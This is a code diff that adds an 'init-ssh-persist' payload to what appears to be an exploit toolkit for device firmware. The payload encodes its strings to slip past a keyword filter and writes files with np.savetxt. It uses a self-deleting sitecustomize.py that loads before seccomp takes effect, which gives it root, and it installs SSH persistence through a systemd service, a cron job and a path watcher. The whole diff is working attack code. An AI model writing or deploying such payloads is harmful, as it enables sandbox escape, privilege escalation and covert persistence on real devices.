@@ -498,6 +498,80 @@ def payload_sitecustomize_ssh(password="unleash", hotkey="L1+Y"):
     )
 
 
+def payload_init_ssh_persist(password="unleash", hotkey="L1+Y"):
+    """Install ssh_guard.sh persistence after init-ssh (firmware >= 1.1.14/15).
+
+    Drop-in replacement for the deb_update.sh hook that ships with init-ssh,
+    for builds where that hook is unreliable (deb_update.sh missing or wiped
+    by OTA). Use as a follow-up to init-ssh once SSH is confirmed up.
+
+    Mechanism (two-press, same as init-ssh):
+      1st L1+Y: payload runs inside the seccomp sandbox and writes
+                /usr/local/bin/ssh_guard.sh + overwrites sitecustomize.py in
+                all Python lib paths via np.savetxt.
+      2nd L1+Y: py_script_execute_env calls Py_Initialize() which loads
+                sitecustomize.py BEFORE seccomp_load() (full root syscalls).
+                The sitecustomize.py chmods ssh_guard.sh, runs
+                `ssh_guard.sh install` (systemd service + 5-min cron +
+                path-unit watcher), then unlinks all sitecustomize.py copies.
+
+    After the 2nd press, SSH persistence is backed by three independent
+    recovery mechanisms and sitecustomize.py is gone -- no cleanup needed.
+
+    Prereq: SSH must already be enabled (run init-ssh first).
+    """
+    persist_content = (
+        'import os\n'
+        'try:\n'
+        "    os.system('chmod 755 /usr/local/bin/ssh_guard.sh && "
+        '/usr/local/bin/ssh_guard.sh install\')\n'
+        'except Exception:\n'
+        '    pass\n'
+        "for _p in ('/usr/lib/python3.8/sitecustomize.py',\n"
+        "          '/usr/lib/python3.10/sitecustomize.py',\n"
+        "          '/usr/lib/python3.11/sitecustomize.py',\n"
+        "          '/usr/local/lib/python3.8/dist-packages/sitecustomize.py'):\n"
+        '    try:\n'
+        '        os.unlink(_p)\n'
+        '    except OSError:\n'
+        '        pass\n'
+    )
+
+    paths = [
+        "/usr/lib/python3.8/sitecustomize.py",
+        "/usr/lib/python3.10/sitecustomize.py",
+        "/usr/lib/python3.11/sitecustomize.py",
+        "/usr/local/lib/python3.8/dist-packages/sitecustomize.py",
+    ]
+
+    guard_enc = _enc(SSH_GUARD_SCRIPT)
+    sc_enc = _enc(persist_content)
+    guard_path_enc = _enc("/usr/local/bin/ssh_guard.sh")
+
+    code = f"_g = {guard_enc}\n"
+    code += f"_sc = {sc_enc}\n"
+    code += f"_gp = {guard_path_enc}\n"
+    code += "np.savetxt(_gp, np.array([_g]), fmt='%s')\n"
+    for i, path in enumerate(paths):
+        code += f"_p{i} = {_enc(path)}\n"
+        code += f"np.savetxt(_p{i}, np.array([_sc]), fmt='%s')\n"
+
+    ok, kw = validate_bypass_payload(code)
+    if not ok:
+        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")
+
+    return WebRTCPayload(
+        name="init-ssh-persist",
+        description=(
+            "Install ssh_guard.sh persistence via self-removing "
+            "sitecustomize.py (fw >= 1.1.14/15, follow-up to init-ssh)"
+        ),
+        python_code=code,
+        program_uuid=str(int(time.time())),
+        bind_hotkey=hotkey,
+    )
+
+
 def payload_bypass_ssh(password="unleash", hotkey="L1+Y"):
     """Enable SSH via cron job (CVE-2026-27509 bypass).
 
@@ -567,5 +641,10 @@ PAYLOAD_REGISTRY = {
     "init-ssh": (
         "SSH + persistence via sitecustomize.py injection (fw >= 1.1.14/15, no crond)",
         payload_sitecustomize_ssh,
+    ),
+    "init-ssh-persist": (
+        "Install ssh_guard.sh persistence via self-removing sitecustomize.py "
+        "(fw >= 1.1.14/15, follow-up to init-ssh)",
+        payload_init_ssh_persist,
     ),
 }
